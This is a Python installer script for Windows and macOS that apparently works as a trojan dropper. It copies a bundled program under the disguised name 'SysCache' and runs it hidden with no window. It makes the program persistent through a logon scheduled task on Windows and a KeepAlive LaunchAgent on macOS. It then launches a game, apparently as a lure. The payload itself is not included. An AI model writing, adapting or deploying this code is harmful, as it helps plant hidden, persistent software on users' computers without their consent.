import os
import platform
import shutil
import subprocess
import sys
from pathlib import Path

APP_NAME = "SysCache"
TASK_NAME = "SysCacheTask"
PLIST_NAME = "com.syscache.plist"


def get_resource_path(filename: str) -> Path:
    if hasattr(sys, "_MEIPASS"):
        base_path = Path(sys._MEIPASS)
    else:
        base_path = Path(__file__).resolve().parent
    return base_path / filename


def get_install_dir() -> Path:
    current_os = platform.system()
    if current_os == "Windows":
        appdata = os.getenv("APPDATA")
        if not appdata:
            raise RuntimeError("APPDATA não está disponível no ambiente Windows.")
        return Path(appdata) / APP_NAME
    if current_os == "Darwin":
        return Path.home() / "Library" / "Application Support" / APP_NAME
    raise RuntimeError(f"Sistema operacional não suportado: {current_os}")


def copy_file_to_install(source_name: str, install_dir: Path) -> Path:
    source_path = get_resource_path(source_name)
    if not source_path.exists():
        raise FileNotFoundError(f"Arquivo não encontrado: {source_path}")

    destination = install_dir / source_name
    shutil.copy2(source_path, destination)
    return destination


def run_detached(command: list[str]) -> None:
    kwargs = {}
    if platform.system() == "Windows":
        kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW
    subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, **kwargs)


def start_game(install_dir: Path) -> None:
    game_path = install_dir / "game.py"
    if not game_path.exists():
        print("[WARN] game.py não encontrado; jogo não iniciado")
        return

    python_cmd = (
        shutil.which("pythonw")
        or shutil.which("python3")
        or shutil.which("python")
        or sys.executable
    )
    run_detached([python_cmd, str(game_path)])


def install_windows(install_dir: Path) -> None:
    exe_dst = copy_file_to_install("main_script.exe", install_dir)
    copy_file_to_install("game.py", install_dir)

    subprocess.run(["schtasks", "/delete", "/tn", TASK_NAME, "/f"], check=False)
    subprocess.run(
        [
            "schtasks",
            "/create",
            "/tn",
            TASK_NAME,
            "/tr",
            f'"{exe_dst}"',
            "/sc",
            "onlogon",
            "/f",
        ],
        check=True,
    )

    run_detached([str(exe_dst)])
    start_game(install_dir)


def build_launch_agent(install_dir: Path, script_path: Path) -> str:
    python_cmd = shutil.which("python3") or sys.executable
    return f"""<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
    <key>Label</key>
    <string>com.syscache</string>
    <key>ProgramArguments</key>
    <array>
        <string>{python_cmd}</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>WorkingDirectory</key>
    <string>{install_dir}</string>
</dict>
</plist>
"""


def install_mac(install_dir: Path) -> None:
    main_dst = copy_file_to_install("main_script_mac.py", install_dir)
    copy_file_to_install("game.py", install_dir)

    launch_agents = Path.home() / "Library" / "LaunchAgents"
    launch_agents.mkdir(parents=True, exist_ok=True)
    plist_path = launch_agents / PLIST_NAME
    plist_path.write_text(build_launch_agent(install_dir, main_dst), encoding="utf-8")

    subprocess.run(["launchctl", "unload", str(plist_path)], check=False)
    subprocess.run(["launchctl", "load", str(plist_path)], check=True)

    python_cmd = shutil.which("python3") or sys.executable
    run_detached([python_cmd, str(main_dst)])
    start_game(install_dir)


def main() -> None:
    install_dir = get_install_dir()
    install_dir.mkdir(parents=True, exist_ok=True)

    current_os = platform.system()
    if current_os == "Windows":
        install_windows(install_dir)
    elif current_os == "Darwin":
        install_mac(install_dir)
    else:
        raise RuntimeError("Somente Windows e macOS são suportados")

    print(f"[OK] Instalação concluída em: {install_dir}")


if __name__ == "__main__":
    main()
